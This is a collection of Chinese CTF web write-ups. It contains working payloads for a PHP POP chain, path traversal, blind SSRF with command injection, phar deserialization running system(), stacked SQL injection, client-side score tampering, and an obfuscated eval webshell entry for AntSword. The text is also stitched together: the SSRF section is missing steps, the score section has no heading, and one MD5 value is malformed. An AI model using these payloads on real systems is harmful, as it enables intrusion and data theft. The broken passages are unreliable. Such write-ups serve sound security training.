    Geek_Challenge2026 — POP 链与长度扩张绕过

    题目类型：Web — PHP 反序列化（POP 链）+ 过滤后长度扩张

    题目地址：Geek_Challenge 2026（实例已关闭）

    Flag：SYC{82a8d7ba-d362-4f0e-a49c-22abe6a72b32}

    题目概述

    题目接收 user 和 sign 两个参数，把它们塞进 A 类后序列化、过一遍过滤器，再反序列化：

    $entry = new A($u, $s);
$ser = serialize($entry);
$escaped = filter($ser);
unserialize($escaped);

    过滤器只有一句话：

    function filter($data) {
    return str_replace("admin", "hacker", $data);
}

    admin 5 个字符，hacker 6 个字符 —— 每替换一次，字符串就多一个字节，但序列化串里的长度数字不会跟着变。

    七个类的骨架（完整源码见文末）：

    A  __destruct  →  echo "…" . $this->sign          （把对象当字符串拼接）
B  __toString  →  (string)$func()                 （把对象当函数调用）
C  __invoke    →  $this->target->$m()             （调用不存在的方法）
D  __call      →  return $this->next->$p          （读取不存在的属性）
E  __get       →  $sink->flag_trigger = $cmd      （写私有属性）
F  __set       →  system($value)                  ← 代码执行在这里

    解题过程

    Step 1：先找能执行代码的地方

    审计代码，先找能执行代码的地方，然后倒着推。

    全文只有一个真正的执行点：

    class F {
    private $flag_trigger;
    public function __set($name, $value) {
        if ($name !== 'flag_trigger') return;
        echo "RCE:<br>";
        system($value);          // ← 终点
    }
}

    所以要满足两个条件：$name === 'flag_trigger'，且 $value 是我能控制的字符串。

    Step 2：倒推 —— 谁能写 F 的私有属性

    $flag_trigger 是 private，从类外部写它就会触发 __set。谁在写它？看 E：

    class E {
    public $sink;
    public $cmd;
    public function __get($name) {
        if (!($this->sink instanceof F)) return;
        $this->sink->flag_trigger = $this->cmd;   // ← 写私有属性
    }
}

    E::__get 里写了 $this->sink->flag_trigger —— 只要 sink 是 F 的实例，就会走到 __set，$value 就是 $this->cmd。

    所以 cmd 就是我的命令，从这里传进去。

    Step 3：倒推 —— 谁读 E 的不存在属性

    __get 是在访问不可访问属性时触发的。看 D：

    class D {
    public $next;
    public $property;
    public function __call($name, $arguments) {
        if (!is_object($this->next) || !is_string($this->property)) return '';
        $p = $this->property;
        return $this->next->$p;      // ← 读 $next 的属性 $p
    }
}

    只要 property 写成 E 里不存在的名字（比如 flag），$this->next->$p 就会触发 E::__get。

    E 的两个属性是 sink 和 cmd，所以 property 不能是这两个 —— 我用的是 flag。

    Step 4：倒推 —— 谁调 D 的不存在方法

    __call 在调用不存在的方法时触发。看 C：

    class C {
    public $target;
    public $method;
    public function __invoke() {
        if (!is_object($this->target) || !is_string($this->method)) return '';
        if (!method_exists($this->target, '__call') || method_exists($this->target, $this->method)) return '';
        $m = $this->method;
        return $this->target->$m();      // ← 调 $target 的方法 $m
    }
}

    这里有个反向条件，最容易看错：

    必须 method_exists($target, '__call')        → target 得是有 __call 的类（就是 D）
必须 !method_exists($target, $method)        → 这个方法名不能真的存在

    所以 method 随便写一个 D 里没有的名字就行（我用 flag），这样才会落到 __call。

    Step 5：倒推 —— 谁把对象当函数调用

    __invoke 在对象被当成函数调用时触发。看 B：

    class B {
    public $action;
    public function __toString() {
        if (!is_object($this->action) || !method_exists($this->action, '__invoke')) return '';
        $func = $this->action;
        return (string)$func();          // ← 对象当函数调
    }
}

    action 放 C 的实例，$func() 就会触发 C::__invoke。

    Step 6：倒推 —— 谁把 B 当字符串

    __toString 在对象被当做字符串处理时触发。 看 A：

    class A {
    public $user;
    public $sign;
    public function __destruct() {
        echo "Welcome to Geek_Challenge2026!<br>";
        echo "Profile signature: " . $this->sign . "<br>";   // ← 字符串拼接
    }
}

    $this->sign 用 . 拼接，把对象当字符串 —— 把 B 的实例放进去，就会触发 B::__toString。

    到这里整条链就闭合了：

    A::__destruct  →  B::__toString  →  C::__invoke  →  D::__call  →  E::__get  →  F::__set  →  system()

    Step 7：构造 pop 链

    这道题完全按照从上往下的顺序触发，所以正着讲就是 A → B → C → D → E → F。

    $a = new A();
$a->user = 'admin';
$a->sign = new B();
$a->sign->action = new C();
$a->sign->action->target = new D();
$a->sign->action->method = 'flag';
$a->sign->action->target->next = new E();
$a->sign->action->target->property = 'flag';
$a->sign->action->target->next->sink = new F();
$a->sign->action->target->next->cmd = 'env';

    Step 8：绕过 __wakeup

    在反序列化时会先调用 __wakeup，然后它会把 $this->action 置为空：

    class B {
    public function __wakeup() {
        echo "唉？你怎么醒了，回去吧你<br>";
        $this->action = null;      // ← 链从这里就断了
    }
}

    所以这里最后输出序列化串的时候，记得把 B 的属性数加 1 绕过 wakeup 方法。

    实际只有 1 个属性，却写成 2      O:1:"B":2:{s:6:"action";O:1:"C":…}

    原理是 CVE-2016-7124：属性数大于实际个数时，PHP 会跳过 __wakeup。只在 PHP < 5.6.25 / 7.0.10 有效 —— 这题能过，说明目标 PHP 就在这个范围内。

    Step 9：为什么是 192 —— 长度扩张

    前面序列化一次、过滤一次，问题出在过滤改变了字符串长度，但长度数字没变。

    设 A = admin 的个数，b = 注入的那串（";s:4:"sign";O:1:"B":2:{…）：

    过滤前   声明长度 N = 5A + len(b)
过滤后   实际长度   = 6A + len(b)      （每个 admin 多 1 字节）
解析器   只读 N 个字节 → 落在 5A + len(b) 这个位置

    注入的 "; 在 b 的开头，也就是过滤后的 6A 处。要让解析器正好读到这里，需要：

    5A + len(b) = 6A     →     A = len(b)

    所以「192」不是随便挑的 —— 它同时是 b 的长度和 admin 的个数。

    这也是为什么换命令的时候别忘记改 admin 的个数：命令变长，b 变长，A 就得跟着变。

    长度别自己数，用 echo strlen($b) 让 PHP 输出，我上面脚本里就是这么做的。

    解题思路总结

    审计源码，先找唯一的执行点：F::__set 里的 system($value)
  → 谁能写 F 的私有属性 → E::__get（写 flag_trigger）
    → 谁读 E 的不存在属性 → D::__call（读 $next->$p）
      → 谁调 D 的不存在方法 → C::__invoke（调 $target->$m）
        → 谁把对象当函数调 → B::__toString（(string)$func()）
          → 谁把 B 当字符串拼 → A::__destruct（echo "…" . $sign）
            → 链成型：A → B → C → D → E → F
              → 属性数 +1 跳过 __wakeup
                → admin 个数 = 注入串长度，让解析器读到注入的 ";
                  → system 执行 → env → flag

    漏洞原理

    ① 魔术方法是"自动触发"的，不是被调用的

    __destruct / __toString / __invoke / __call / __get / __set 都不需要显式调用 —— 只要你把对象放在那个位置，PHP 自己会触发。

    反序列化的价值就在于：我能完全控制每个属性的值和类型。

    ② 每一层都有前置检查，但检查的是"类型"不是"意图"

    层 检查什么 怎么满足
    B action 是对象且有 __invoke 放 C 的实例
    C target 是对象、method 是字符串、target 有 __call、且没有同名方法 放 D 的实例，方法名随便写
    D next 是对象、property 是字符串 放 E 的实例
    E sink 是 F 的实例 放 F 的实例
    F $name === 'flag_trigger' 由 E 固定写入这个属性名

    ③ 长度扩张：过滤器和序列化器看到的长度不一样

    serialize()  按"过滤前"的长度写进串
filter()     把 5 字节的 admin 换成 6 字节的 hacker
unserialize() 按串里写的长度去读 —— 读的位置被"多出来的字节"整体推后

    于是我可以控制"解析器停在哪" —— 停在注入的 "; 上，后面那一串就成了新的结构。

    关键知识点

    知识点 说明
    找终点 审计先找执行点（system / eval / include / call_user_func），再倒着推
    POP 链 利用属性把对象串起来，靠魔术方法的自动触发一层层走到终点
    反向条件 !method_exists($target, $method) —— 要求方法名不存在，最容易看错
    __wakeup 绕过 序列化串里属性数写大于实际个数（CVE-2016-7124，PHP < 5.6.25 / 7.0.10）
    长度扩张 过滤器把短串换成长串，序列化串里的长度数字不变 → 解析位置错位
    长度对齐 admin 的个数必须等于注入串的长度，解析器才会正好停在注入的 "; 上
    工具 长度用 strlen() 输出，不要手数
    PHP 魔术方法的触发时机

    （这段是原理的地基 —— 记住"在什么时机被自动调用"，POP 链就是按时机拼起来的。）

    方法 触发时机
    __construct() 用于在创建对象时自动触发：当使用 new 关键字实例化一个类时，会自动调用该类的 __construct() 方法
    __destruct() 用于在对象被销毁时自动触发：对象被销毁、引用计数减少为零时触发
    __sleep() 序列化 serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组
    __wakeup() 用于在反序列化对象时自动调用：unserialize() 会检查是否存在一个 __wakeup() 方法，如果存在，则会先调用 __wakeup() 方法
    __toString() 在对象被当做字符串处理时自动调用，比如 echo、==、preg_match()
    __invoke() 在对象被当做函数处理时自动调用
    __call() __call($method, $args) 在调用一个不存在的方法时触发，$args 是数组的形式
    __callStatic() 在静态调用或调用成员常量时，使用的方法不存在时触发
    __set() 在给不存在的成员属性赋值时触发
    __isset() 在对不可访问属性使用 isset() 或 empty() 时会被触发
    __unset() 在对不可访问属性使用 unset() 时会被触发
    __clone() 当使用 clone 关键字拷贝完成一个对象后就会触发
    __get() 当尝试访问不可访问属性时会被自动调用

    史迪仔的文件预览器 — Writeup

    题目类型：Web — 目录穿越（Path Traversal）

    题目地址：http://80-e887e1a6-2d07-4b5b-9e6e-5d3e06543451.challenge.ctfplus.cn/

    Flag：flag{1f0be3ba-b8f6-4a5a-9b05-c8d69e8769fd}

    题目概述

    页面是一个"文件预览器"，输入文件名即可查看实验室资料。默认提供示例文件 hello.txt。

    解题过程

    Step 1：查看默认文件

    先访问默认的 hello.txt，内容如下：

    Hello, ZeroG!
Welcome to PwnStars Cybersecurity Lab.

    没有有用信息，只是普通的欢迎语。

    Step 2：查看源码，发现线索

    右键查看页面源代码，在 HTML 底部发现一行注释：

    <!-- TODO: README.txt 后续需要整理 -->

    这说明服务器上存在一个 README.txt 文件，但页面上没有直接暴露。

    Step 3：直接读取 README.txt — 失败

    在文件名输入框中输入 README.txt，返回：

    File not found.

    说明 README.txt 不在当前可读目录中。

    Step 4：尝试目录穿越

    既然文件不在当前目录，尝试使用 ../ 进行目录穿越：

    ../README.txt

    仍然返回 File not found.，说明服务器对 ../ 进行了过滤（替换为空）。

    Step 5：绕过过滤 — 成功读取 README.txt

    服务器只做了一次 ../ → 空的替换，可以利用双写绕过。输入：

    ....//README.txt

    服务器将中间的 ../ 删除后，剩余字符重新拼成 ../README.txt，成功读到文件内容：

    Stitch File Preview System

Public files are stored in /files/.

For administrators:

Sensitive files are stored in /secret/.

    README.txt 揭示了目录结构：

    • 公开文件存储在 /files/
    • 敏感文件存储在 /secret/

    Step 6：读取 /secret/ 下的 flag

    既然知道敏感文件在 /secret/ 目录下，CTF 中常见的 flag 文件名就是 flag.txt。使用同样的绕过方式构造路径：

    ....//secret/flag.txt

    成功拿到 flag：

    flag{1f0be3ba-b8f6-4a5a-9b05-c8d69e8769fd}

    解题思路总结

    访问 hello.txt（无有用信息）
  → 查看源码，发现 HTML 注释提到 README.txt
    → 直接读 README.txt 失败（文件不在当前目录）
      → 尝试 ../ 目录穿越，失败（被过滤）
        → 用 ....// 双写绕过过滤，成功读取 README.txt
          → 发现敏感文件在 /secret/ 目录
            → ....//secret/flag.txt 读到 flag

    漏洞原理

    服务器对用户输入的 file 参数进行了简单的过滤 —— 将 ../ 替换为空字符串。但这个过滤只执行一次，攻击者可以通过双写 ....// 来绕过：

    输入:      ....//README.txt
过滤后:    ../README.txt    （中间的 ../ 被删除，两侧的 . 和 / 重新拼合）

    关键知识点

    知识点 说明
    查看源码 HTML 注释中经常藏有线索
    目录穿越 利用 ../ 跳出当前目录读取其他文件
    过滤绕过 双写 ....// 绕过单次 ../ 替换过滤
    信息收集 利用已读到的文件内容（README.txt）获取目录结构信息

    Stage2 — Can't see the result? Just take it out（Internal Shop）

    题目类型：Web — SSRF + 命令注入（无回显）

    题目地址：ZeroG CTF 2026 · Stage2（实例已关闭）

    Flag：flag{65e49f2f-8785-4b8a-809f-247089a45efd}

    题目概述

    和 ZeroG_2026（Stage 2） 不是同一题 —— 那篇是 PHP 弱类型与参数名变形，这篇是 SSRF。

    站点叫 Internal Shop，是一个"多平台价格比价系统"。输入商品页 URL，服务端去抓取并比价。

    导航里还有一个「系统信息」页 —— 后面就是从这里拿到内部接口的。

    解题过程

    Step 1：从两个页面提取信息

    首页是一个 URL 输入框，右上角有两个入口：「比价抓取」和「系统信息」。

② 主站不会把内部响应显示出来 —— 也就是说，就算打通了也是"盲"的

    返回：

非法的 URL

    说明 127.0.0.1 被黑名单挡了。

    127.0.0.1 有很多等价写法，只要目标解析到同一个地址、但不命中黑名单里的字符串就行：

    这里我用的是 127.1：

    http://127.1:5001/api/debug?cmd=whoami

    抓取成功了：

    但页面只说"已完成比价，结果稍后通过邮件发送" —— 内部响应确实不回显。

    Step 4：把结果带出来 — 重定向写到静态目录

    既然拿不到回显，那就让内部命令自己把结果写到主站能访问到的地方。

    <link rel="stylesheet" href="/static/style.css">

    Step 5：输出里混进了 Debug — 需要闭合前一句

    也就是说，我传的 >static/out.txt 会把整个 echo 的结果改写进文件，而不只是命令输出。

    http://127.1:5001/api/debug?cmd=;whoami>static/aa.txt

    闭合之后输出就干净了：

    root

    能写文件、能读文件，接下来就是找 flag。先查环境变量（比翻目录快）：

    漏洞原理

    ① SSRF：服务端替我去请求

    比价功能必须由服务端抓取 URL，这个"抓取"没有限制目标 —— 于是可以把目标指向只有服务器自己能访问的 127.0.0.1:5001。

    ② 黑名单只匹配字符串，不匹配语义

    被拦：127.0.0.1
放过：127.1        ← 同一个地址，字符串不同

    127.1 是 IPv4 的短格式，解析器会自动补全成 127.0.0.1。黑名单拦的是写法，不是地址。

    ③ 无回显：把输出换成"写入可访问路径"

    正常思路   命令 → 响应 → 我看
无回显     命令 → 重定向写文件 → 我再访问那个文件

    ④ 闭合：输出里混了别的东西，说明它被包在一句话里

    看到 Debug: 和命令结果一起出现，就知道后端大概在做字符串拼接。; 把前一句结束掉，重定向才只作用于我的命令。

    附：三个问题

    ① poster.jpg?v=1793248668 里的 v= 是什么

    缓存破坏参数（cache buster）。

    文件名永远是 poster.jpg，浏览器会缓存旧图；加一个每次变化的 v（通常是 Unix 时间戳）让 URL 变掉，强制重新下载。

    1793248668 ≈ 2026-10-29 的 Unix 时间戳（秒）

    服务器不读它，PHP 也不用它 —— 纯前端约定。 对我们反而有用：改完 payload 带上新 v，能确保看到的是新响应。

    ② 为什么用 env 找 flag，而不是找目录

    因为 flag 不一定是文件。

    这题的 flag 是平台在容器启动时通过环境变量注入的，不落盘：

    flag 不落盘 → 读文件读不到 → 备份/目录遍历/源码泄露都拿不到
只有真正拿到 RCE 才能读 → 考的是"能执行命令",不是"能猜路径"

    排查顺序应该是：

    ① ls -la /            先看有没有 flag 文件
② env                 没有就查环境变量
③ find / -name "*flag*"   再扫一遍
④ cat /proc/self/environ  环境变量换个读法

    ③ 能不能用 $_POST + 蚁剑

    能，但 echo$_POST["1"]`` 这种写法不行。

    echo \...`` 是命令执行** —— 参数被当 shell 命令跑。**

    蚁剑要的是代码执行** —— 它往参数里塞的是 PHP 代码，入口必须是：**

    eval($_POST['x'])

    而 eval 在黑名单里，所以要用拼接：

    $a='ev'.'al'; $a($_POST[1]);

    关键点：这道题的黑名单只扫上传文件的内容，不扫 HTTP 请求体 —— 所以蚁剑发过来的 body 里带什么词都不受影响。

    ZeroG_2026（Stage 2）

    三层，一层比一层贴源码。

    第一层：正则 + 严格不等

    if (isset($_GET['zero'])
    && preg_match('/^ZeroG 2026!$/', $_GET['zero'])
    && $_GET['zero'] !== 'ZeroG 2026!') {

    审计代码第一层：正则里的 ^ 意味着从第一个字符就要匹配，$ 意味着到这里就要终止，所以原字符串要是 ZeroG 2026!，但是后面又要 !==（严格不等）。

    这里补充 PCRE 的 $：它除了匹配字符串末尾，还可以匹配"末尾换行之前"，所以在末尾加上 \n 也可以，这样就绕过了第一层。

    ?zero=ZeroG%202026!%0A

    第二层：intval 和算术运算用两套规则

    if (intval($_GET['xp']) < 2026 && intval($_GET['xp'] + 4) > 2030) {

    这里用到了 intval，就系统去补充了一下相关知识：

    行为 例子
    截断小数点 intval(0.9) = 0
    只取前导数字 intval("123abc") = 123
    反过来不行 intval("abc123") = 0（不是 123）
    带进制参数 intval($a, $b) $b = 0 时看前缀：0 开头按 8 进制、0x 开头按 16 进制，否则按 10 进制

    接着看到这里：既要小于 2026，又要加 4 之后大于 2030。

    最开始想的是用字符串改小进制，但这里不行。所以想到用 2025e9：

    intval('2025e9')  = 2025            ← 遇到 e 就直接停了
'2025e9' + 4      = 2.025e12        ← 2025×10⁹，算术运算先算完，才交给 intval

    同一个字符串，被两套规则解释：intval() 只认前导整数，算术运算认科学计数法。

    ?zero=ZeroG%202026!%0A&xp=2025e9

    第三层：弱等于模拟强等于 + 一个 [ 的妙用

    if (isset($_POST['Welcome__ctf.2026']) && isset($_POST['mm'])) {
    $a = $_POST['Welcome__ctf.2026'];
    $b = $_POST['mm'];
    if ($a !== $b && md5($a) == md5($b)) {

    用 ==（弱等于）去模拟 !==（强不等）： 找一组 MD5 值都以 0e 开头的数据：

    QNKCDZO   → md5 = 0e830400451993494058024219903391
240610708 → md5 = 0e462097431906509019562562988736854

    两个 0e... 在 == 下都被当成 0 × 10ⁿ = 0，所以相等；但原字符串不同，!== 也成立。

    接着构造：

    Welcome__ctf.2026=QNKCDZO&mm=240610708&code=system('cat /flag*');

    当然没有这么简单 —— 因为 PHP 会把参数名里的 . 转换成 _，所以这个名字根本出不来。

    我也卡在这里很久。

    最后发现的东西

    PHP 7.4 的源码逻辑：循环转换 . 和空格，但是遇到 [ 会直接把它替换成 \0（字符串截断符），然后跳出循环：

    跳出循环之后，PHP 认为这是数组语法，会去寻找与之配对的 ] —— 但是找不到！

    找不到之后，又会把刚刚的 \0 换回 _，恢复完整字符串：

    所以只要把其中一个 _ 改成 [，就能让结果刚好等于原来的名字：

    Welcome__ctf.2026   →  循环走完全程 → 点被转 → Welcome__ctf_2026   ✗
Welcome_[ctf.2026   →  在 [ 处 break → 点没被处理 → 恢复 [ 为 _ → Welcome__ctf.2026   ✓

    一个字符同时做了两件事：截断循环（让点逃过转换）+ 恢复之后补回那个下划线。

    最终 payload：

    Welcome_[ctf.2026=QNKCDZO&mm=240610708&code=system('cat /flag*');

    拿到 flag。

    cat /flag* 和 cat flag* 的区别

    这里试了一下：cat flag* 抓不到，cat /flag* 才能抓到。

    原因是当前工作目录。web 进程的 cwd 是网站目录（/var/www/html 之类），而 flag 文件在根目录 /：

    cat flag*     ← 相对路径，在网站目录里找 → 找不到
cat /flag*    ← 绝对路径，从根目录找     → 命中

    同一类问题在上一道题里是反过来的：那次 cat /index.php 失败、cat index.php 成功，因为文件就在 cwd 里。

    所以路径没有好坏，只有对不对得上文件所在的位置。

    一个版本细节

    intval('2025e9') 只在 PHP 5 上返回 2025。

    PHP 5:   intval('2025e9') = 2025            ← 遇到 e 就停
PHP 7.1: intval('2025e9') = 2025000000000   ← 也认科学计数法了

    我在本地 PHP 7.4 上实测确认过：intval('2025e9') 返回 2025000000000，第一个条件就直接不成立。

    所以这一关只在 PHP 5 的老环境上成立 —— 换个环境，同一个 payload 就废了。

    盯住 claim

    claim 出现了 grades 这个字段，对其进行 base64 解码：

    eyJzY29yZSI6MH0=   →   {"score":0}

    这不就是我的得分吗？那这里就明确了。

    分数是浏览器自己算出来、自己 base64 一下、再交给服务器的 —— 服务器完全相信这个数字。

    直接修改分数为 3000，再做一次 base64 编码，抓包改掉 grades，发回去：

    {"score":3000}  →  eyJzY29yZSI6MzAwMH0=

    成功得到 flag。

    {
  "ok": true,
  "code": "TARGET_REACHED",
  "message": "终点信号已解锁",
  "score": 3000,
  "target": 3000,
  "flag": "ZeroG{...}"
}

    补充：为什么 base64 挡不住

    这段代码其实自己就写着答案：

    function encodeGrades(score) {
  return btoa(JSON.stringify({ score }));   // btoa = base64 编码
}

    函数名是 encode，不是 sign。

    这四个词的区别值得记：

    词 含义 能不能防改
    encode 编码（base64、hex、URL） ❌ 只是换衣服，谁都能脱
    encrypt 加密（AES、RSA） ✅ 但要密钥
    hash 哈希（md5、sha256） ✅ 单向，但这里只存不比对
    sign 签名（HMAC、RSA 签名） ✅ 改了就对不上

    只有最后一种能真正防篡改 —— 因为它需要服务器持有的密钥，前端拿不到。

    这类题的通法

    ① F12 → Network，玩一局，看发了哪些请求
② 找到"提交结果"的那个请求
③ 看提交的字段是怎么产生的：
     · 明文？          → 直接改
     · base64 / hex？  → 编码而已，解开改
     · 带签名？        → 找密钥（前端藏了也能拿到）
     · 服务器发的 token？→ 看能不能复用
④ 这个值是服务器算的，还是浏览器算的？
     浏览器算的 → 一定能伪造
     服务器算的 → 得去找逻辑漏洞

    这道题属于第 ④ 条最简单的那种：分数完完全全是浏览器算的。

    源码

    <?php
show_source(__FILE__);
class Flag{
    public $code;
    public function __destruct(){
        // TODO: Implement __destruct() method.
        eval($this->code);
    }
}
$filename = $_GET['filename'];
file_exists($filename);
?>
upload something

    审计代码发现只要触发 __destruct 就可以执行代码，所以要想办法触发 __destruct。

    想到 phar 反序列化可以在没有 unserialize() 的情况下触发 __destruct —— 代码里唯一的入口就是 file_exists($filename)，而它正好是能吃 phar:// 的文件函数。

    为什么能这样：phar 文件的 manifest 里可以存一段序列化 metadata；任何函数只要访问 phar:// 开头的路径，PHP 就会解析这个 phar，解析时把 metadata 自动反序列化 —— 于是对象被重建，脚本结束时 __destruct() 自动执行。

    找上传点

    源代码强调了 upload，去访问一下 upload.php。

    先随便尝试上传一个 txt 文件，提示只能 jpg/jpeg。

    将 txt 文件修改后缀可以直接上传，所以就明确了这道题的方向：构造一个 phar 文件，修改后缀为 jpg 上传之后通过 phar:// 触发。

    造 phar

    <?php
class Flag {
    public $code;
}

$f = new Flag();
$f->code = "system('cat /fffl11laaaggg');";   // 第一步是 ls / 先找到 flag 文件

$p = new Phar(__DIR__.'/b.phar');
$p->startBuffering();
$p->addFromString('test.txt', 'x');
$p->setStub('<?php __HALT_COMPILER(); ?>');
$p->setMetadata($f);
$p->stopBuffering();
?>

    php 文件写好后通过 shell 执行：

    php.exe -d phar.readonly=0 ds.php

    就会生成一个 b.phar 的文件，将其后缀改完后上传。

    触发

    第一次我让 code 写的是 ls /（想先找 flag 文件），页面返回：

    Parse error: syntax error, unexpected end of file
in /var/www/html/index.php(7) : eval()'d code on line 1

    这行报错其实是最好的证据** —— 它同时说明了三件事：**

    报错里的信息 说明
    eval()'d code __destruct() 真的执行了
    index.php(7) 就是源码里 eval($this->code); 那一行
    syntax error phar 被解析、metadata 反序列化成功，只是 ls / 不是合法 PHP

    也就是说链路已经通了，只是内容不对。 把 code 换成合法的 PHP 语句后：

    最终 payload：

    ?filename=phar://upload/b.jpg/test.txt

    成功得到 flag。

    [强网杯 2019] 随便注

    先试万能密码：

    1' or 1=1-- -

    看着是没什么用的。

    接着试其他的，发现了 select 等被过滤了：

    那么时间盲注、报错注入、联合查询、布尔盲注就都无法使用了 —— 这几种要么离不开 select，要么离不开 where。

    还有一处容易漏看：过滤名单里带了 \.（点）。点被挡，意味着 information_schema.tables 这种写法根本发不出去 —— 所以后面查表只能靠 show tables，不是因为我们想省 select，是因为连表名都没法用点拼出来。

    那就试试堆叠注入。堆叠查询可以一次执行多条独立语句，show、handler、rename、alter 这些都不需要 select，正好绕开过滤。

    发现可以。那么就分别进行查表和查列：

    1';show tables;-- -

    查到两个表：1919810931114514 和 words。

    1';show columns from `1919810931114514`;-- -


    1';show columns from `words`;-- -

    words 表里没有 flag。

    到这里有两种做法。

    做法一：handler

    handler 就是直接打开一张表、按行读：

    通过 handler 可以直接查询到 flag：

    1';handler `1919810931114514` open;
handler `1919810931114514` read first;
handler `1919810931114514` close;-- -

    得到 flag。

    注意：作为表名的数字要用反引号括起来 —— 1919810931114514 是一个以数字开头的名字，不加引号 MySQL 不认它是标识符。Linux 下单引号和反引号都可以（单引号在进 MySQL 之前就被 shell 吃掉了），Windows 下只能用反引号。

    做法二：改表名，让原始查询帮我查

    这里我们先推测初始查询语句。

    首先通过 1' -- - 的回显判断出是单引号闭合的。

    再通过 show 堆叠查询到两个表，通过查询发现 words 中有两个列，但是那个数字表中只有一个列。

    那么因为在初始查询的时候它返回的是两个列，所以这里就知道了它的语句是：

    select * from words where 列 = '1';

    至于为什么是 select *，是因为它回显有两个列；一个列返回的是数字，一个列返回的是数据，这里就可以知道查询的是 id 了。

    所以最初的查询语句应该为：

    select * from words where id = '$inject'

    所以到了这里我们就可以利用它固定的原始语句来查询了。既然它查的表名列名分别为 words 和 id，那我们就把 flag 所在的表名和列名修改为 words 和 id：

    1';rename table words to everything;
rename `1919810931114514` to words;
alter table words change flag id VARCHAR(100);-- -

    接着再用万能密码：

    1' or 1=1-- -

    成功得到 flag。

    这里有个地方值得停一下：rename 之后新的 words 表只剩 id 一列，而原始语句是 select *，页面是按两列渲染的 —— 少一列为什么还能出？

    我这边是直接出的 flag，没有报错。所以 PHP 那边应该只是把第一列取出来显示，缺第二列不影响，顶多是个 Notice 被吞掉了。
